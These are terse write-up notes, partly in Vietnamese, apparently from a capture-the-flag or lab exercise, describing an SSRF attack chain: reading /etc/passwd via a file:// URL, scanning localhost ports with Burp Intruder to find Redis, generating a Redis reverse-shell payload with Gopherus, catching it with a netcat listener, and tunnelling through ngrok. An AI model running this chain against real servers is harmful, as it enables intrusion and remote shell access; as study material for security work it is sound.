## Step 1: file:///etc/passwd
=> SSRF
## Step 2: Scan port by Intruder of burp suite
url = localhost:$port$
vì nhiều server nó chỉ mở port cho các máy cục bộ kết nối nên scan từ ngoài nhiều khi ko đc (lỗi ở đây là mình lợi dụng localhost)
=> port 6379 (redis)
## Step 3: Gopherus
> gopherus --exploit redis
> reverseshell
## Step 4: 
On my PC: 
> nc -lvnp 1234

up payload to SSRF box.

==> done

# Note: 
if !vps: ==> can use ngrok để có thể nc được ra ngoài LAN
> ngrok tcp 1234
*sửa payload thành url với port của ngrok*
máy mình vẫn nc như trên bình thường.